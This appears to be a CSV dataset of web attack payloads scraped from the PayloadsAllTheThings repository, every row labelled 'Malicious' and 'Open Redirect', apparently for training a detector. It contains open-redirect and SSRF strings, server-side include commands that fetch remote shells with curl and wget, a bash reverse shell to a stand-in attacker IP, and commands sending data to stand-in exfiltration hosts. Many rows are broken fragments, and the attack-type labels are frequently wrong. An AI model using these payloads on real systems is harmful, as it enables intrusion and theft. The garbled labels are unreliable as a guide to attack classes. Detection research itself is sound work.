Payload,Signature,AttackType,Severity,MITRE,Label,Description
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
var redirectTo = """"http://trusted.com"""";""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
window.location = redirectTo;,OpenRedirect_Generic,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
?redirect_uri={payload},OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
?redirect_url={payload},OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
?redirect={payload},OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/redirect/{payload},OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
www.whitelisted.com.evil.com redirect to evil.com,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
An attacker could exploit an open redirect here by replacing the ",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Using slashes in URLs: """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Critical,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!--#exec cmd=""curl http://sn1persecurity.com/.testing/rfi_vuln.php"" -->",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!--#exec cmd=""wget http://website.com/dir/shell.txt"" -->",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!--#include virtual=""http://sn1persecurity.com/.testing/rfi_vuln.php"" -->",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!--#include virtual=""https://crowdshield.com/.testing/rfi_vuln.php"" -->",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<esi:include src=""http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/""/>",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<esi:include src=""http://host/poc.xml"" dca=""xslt"" stylesheet=""http://google.com/poc.xsl"" />",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<esi:include src=http://google.com/>,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
(2) URL encode the result and append to https://exfiltrate.server.net/data=,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Leak prompt: """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Force XSS output: """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Force SQLi output: """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* SSRF vulnerability: """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://google.com/%2f..,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.whitelisteddomain.tld@google.com/%2f..,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.google.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://google.com/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.whitelisteddomain.tld@google.com/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https://google.com//,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https://www.whitelisteddomain.tld@google.com//,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https://www.google.com/%2e%2e%2f,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//https:///www.google.com/%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.google.com/%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.whitelisteddomain.tld@www.google.com/%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.google.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https:///www.google.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e,DirTraversal_Path,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://%5cgoogle.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/https://%5cwww.whitelisteddomain.tld@google.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
The following PHP script can be used to generate a page that will redirect to the ",XSS_Script,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
jar:http://127.0.0.1!/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
jar:https://127.0.0.1!/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
jar:ftp://127.0.0.1!/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ssrf.php?url=http://127.0.0.1:22,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ssrf.php?url=http://127.0.0.1:80,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ssrf.php?url=http://127.0.0.1:443,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ssrf.php?url=sftp://evil.com:11111/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"| localtest.me                 | """,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"   """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"2. Launch the SSRF pointing to """,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Redirects to """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Redirects to """,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"For example to rotate between """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Parsing behavior by different libraries: """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 and browsers redirect to ,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
window.opener.location = """"http://evil.com""""""",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# Vuln website : https://github.com/ajinabraham/bad_python_extract,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# More info : https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# Written by Wireghoul - http://www.justanotherhacker.com,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[Supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) and [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). In ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
test = @(http://[REDACTED]),OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"fill 'url(https://127.0.0.1/test.jpg""|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch ""hello)'",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* """,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Use double extensions : """,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* PNG: """,CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Create a custom picture and insert exif tag with """,SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
The ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,Open Redirect,High,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"curl -F ""r=`id`"" http://yourServer:1337/",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
	Source: http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"	print("" |  website: http://virtualabs.fr"")",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
apply-to-redirect-ref,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
header-status-redirect,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
origin~https://%s.%h,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirected-accept-language,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect-found,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-found,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-multiple-choices,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-not-modified,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-permanent,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-see-other,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-temporary,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-unused,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirection-use-proxy,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect-perm,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect-post,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect-problem-withoutwww,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect-problem-withwww,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect-proxy,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
redirect-temp,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
referer~http://%s.%h/,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
request-error-redirects,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
temporary-redirect,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
x-amz-website-redirect-location,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
x-flx-redirect-url,OpenRedirect_Generic,Open Redirect,Low,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
prips 93.184.216.0/24 | hakoriginfinder -h https://example.com:443/foo,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"curl -H ""Host: admin.example.com"" http://10.10.10.10/",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
2. Detecting normalization: ",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"token = requests.get(""https://example.com/uuid"").json()[""uuid""]",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump,OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits),OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    ",XSS_Script,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<html xsl:version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",OpenRedirect_Generic,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<xsl:copy-of select=""document('http://172.16.132.1:25')""/>",SQLi_Keyword,Open Redirect,Medium,T1190,Malicious,Open Redirect payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
